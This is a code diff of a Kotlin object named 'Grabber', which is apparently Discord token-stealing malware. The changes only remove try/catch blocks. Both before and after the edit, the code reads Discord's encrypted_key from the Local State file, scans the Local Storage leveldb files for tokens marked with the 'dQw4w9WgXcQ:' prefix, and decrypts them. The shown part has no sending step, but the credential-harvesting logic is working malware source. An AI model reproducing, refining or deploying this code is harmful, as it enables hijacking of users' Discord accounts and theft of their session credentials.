@@ -16,13 +16,9 @@ object Grabber {
         if (key == null || tokens == null) return null
         val decryptedTokens = LinkedList<String>()
         for (s in tokens) {
-            try {
-                val z = Base64.getDecoder().decode(key)
-                val y = z.copyOfRange(5, z.size)
-                decryptedTokens.add(decrypt(Base64.getDecoder().decode(s), y))
-            } catch (e: Exception) {
-                // Handle exception
-            }
+            val z = Base64.getDecoder().decode(key)
+            val y = z.copyOfRange(5, z.size)
+            decryptedTokens.add(decrypt(Base64.getDecoder().decode(s), y))
         }
         return decryptedTokens
     }
@@ -32,30 +28,22 @@ object Grabber {
         val regex = "dQw4w9WgXcQ:"
         val files = File("${System.getenv("APPDATA")}\\discord\\Local Storage\\leveldb\\").listFiles()
         files?.forEach { file ->
-            try {
-                BufferedReader(FileReader(file)).use { br ->
-                    var line: String?
-                    while (br.readLine().also { line = it } != null) {
-                        if (line!!.contains(regex)) token.add(line!!.split(regex)[1].split("\"")[0])
-                    }
+            BufferedReader(FileReader(file)).use { br ->
+                var line: String?
+                while (br.readLine().also { line = it } != null) {
+                    if (line!!.contains(regex)) token.add(line!!.split(regex)[1].split("\"")[0])
                 }
-            } catch (e: Exception) {
-                // Handle exception
             }
         }
         return token
     }
 
     private fun getKey(): String? {
-        try {
-            BufferedReader(FileReader(File("${System.getenv("APPDATA")}\\discord\\Local State"))).use { brs ->
-                var line: String?
-                while (brs.readLine().also { line = it } != null) {
-                    return JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
-                }
+        BufferedReader(FileReader(File("${System.getenv("APPDATA")}\\discord\\Local State"))).use { brs ->
+            var line: String?
+            while (brs.readLine().also { line = it } != null) {
+                return JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
             }
-        } catch (e: Exception) {
-            // Handle exception
         }
         return null
     }
